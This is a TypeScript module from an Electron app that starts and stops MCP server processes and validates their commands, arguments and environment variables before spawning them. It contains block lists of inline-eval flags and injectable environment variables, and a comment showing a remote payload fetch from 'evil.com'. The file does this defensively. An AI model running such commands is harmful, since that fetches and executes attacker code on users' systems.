import { spawn, type ChildProcess } from 'node:child_process'
import { existsSync, readFileSync, writeFileSync, mkdirSync } from 'node:fs'
import { join } from 'node:path'
import { app } from 'electron'

export interface McpServerConfig {
  id: string
  name: string
  command: string
  args: string[]
  env: Record<string, string>
  autoStart: boolean
}

type McpStatus = 'running' | 'stopped' | 'error'

const ALLOWED_MCP_COMMANDS = new Set(['npx', 'node', 'python', 'python3', 'deno', 'uvx', 'bunx', 'bun', 'uv'])

// Flags that allow inline code execution per runtime
const BLOCKED_ARG_PATTERNS: Record<string, RegExp[]> = {
  node:    [/^-[erpc]$/, /^--eval$/, /^--require$/, /^--print$/, /^--input-type$/],
  python:  [/^-[cm]$/],
  python3: [/^-[cm]$/],
  deno:    [],
  uvx:     [],
  bunx:    [],
  bun:     [/^-e$/, /^--eval$/],
  npx:     [],
  uv:      [],
}

const BLOCKED_ENV_KEYS = new Set([
  'PATH', 'NODE_PATH', 'PYTHONPATH', 'HOME', 'USERPROFILE', 'LD_PRELOAD', 'LD_LIBRARY_PATH',
])

function validateMcpArgs(command: string, args: string[]): void {
  const blockedPatterns = BLOCKED_ARG_PATTERNS[command] ?? []
  for (const arg of args) {
    for (const pattern of blockedPatterns) {
      if (pattern.test(arg)) {
        throw new Error(`Argument '${arg}' is not permitted for command '${command}'`)
      }
    }
    // Block URLs in args (prevents deno run https://evil.com/payload.ts)
    if (/^https?:\/\//i.test(arg)) {
      throw new Error(`URL arguments are not permitted: ${arg}`)
    }
  }
}

function validateMcpEnv(env: Record<string, string> | undefined): void {
  for (const key of Object.keys(env ?? {})) {
    if (BLOCKED_ENV_KEYS.has(key)) {
      throw new Error(`Environment variable '${key}' cannot be overridden`)
    }
  }
}

export class McpProcessManager {
  private readonly processes = new Map<string, ChildProcess>()
  private readonly statuses  = new Map<string, McpStatus>()
  private configs: McpServerConfig[] = []

  constructor() {
    this.configs = this.load()
  }

  private configPath(): string {
    const dir = app.getPath('userData')
    if (!existsSync(dir)) mkdirSync(dir, { recursive: true })
    return join(dir, 'mcp-servers.json')
  }

  private load(): McpServerConfig[] {
    const path = this.configPath()
    if (!existsSync(path)) return []
    try { return JSON.parse(readFileSync(path, 'utf-8')) as McpServerConfig[] }
    catch { return [] }
  }

  private save(): void {
    writeFileSync(this.configPath(), JSON.stringify(this.configs, null, 2), 'utf-8')
  }

  listServers(): McpServerConfig[] { return [...this.configs] }

  getStatus(id: string): McpStatus { return this.statuses.get(id) ?? 'stopped' }

  getStatuses(): Record<string, McpStatus> {
    return Object.fromEntries(this.statuses.entries())
  }

  async addServer(config: McpServerConfig): Promise<void> {
    this.configs = this.configs.filter((c) => c.id !== config.id)
    this.configs.push(config)
    this.save()
    if (config.autoStart) await this.startServer(config.id)
  }

  async removeServer(id: string): Promise<void> {
    await this.stopServer(id)
    this.configs = this.configs.filter((c) => c.id !== id)
    this.save()
  }

  async startServer(id: string): Promise<void> {
    const config = this.configs.find((c) => c.id === id)
    if (!config) throw new Error(`MCP server not found: ${id}`)
    if (this.processes.has(id)) return
    if (!ALLOWED_MCP_COMMANDS.has(config.command)) {
      throw new Error(`MCP command not allowed: ${config.command}`)
    }
    validateMcpArgs(config.command, config.args)
    validateMcpEnv(config.env)

    const proc = spawn(config.command, config.args, { // NOSONAR: command validated against ALLOWED_MCP_COMMANDS allowlist; args validated by validateMcpArgs(); shell:false prevents injection
      env: { ...process.env, ...config.env },
      stdio: ['ignore', 'pipe', 'pipe'],
      shell: false,
    })

    this.processes.set(id, proc)
    this.statuses.set(id, 'running')

    proc.on('exit', () => {
      this.processes.delete(id)
      this.statuses.set(id, 'stopped')
    })
    proc.on('error', (err) => {
      console.error(`MCP server ${id} error:`, err)
      this.processes.delete(id)
      this.statuses.set(id, 'error')
    })
  }

  async stopServer(id: string): Promise<void> {
    const proc = this.processes.get(id)
    if (!proc) return
    await new Promise<void>((resolve) => {
      proc.once('exit', () => resolve())
      proc.kill('SIGTERM')
      // 3초 후 강제 종료 폴백
      setTimeout(() => {
        if (this.processes.has(id)) proc.kill('SIGKILL')
        resolve()
      }, 3000)
    })
    this.processes.delete(id)
    this.statuses.set(id, 'stopped')
  }

  stopAll(): void {
    const ids = [...this.processes.keys()]
    for (const id of ids) {
      this.stopServer(id).catch((err: unknown) => {
        console.error(`[McpProcessManager] stopAll error for ${id}:`, err)
      })
    }
  }

  async startAutoStart(): Promise<void> {
    for (const config of this.configs) {
      if (config.autoStart) await this.startServer(config.id)
    }
  }
}
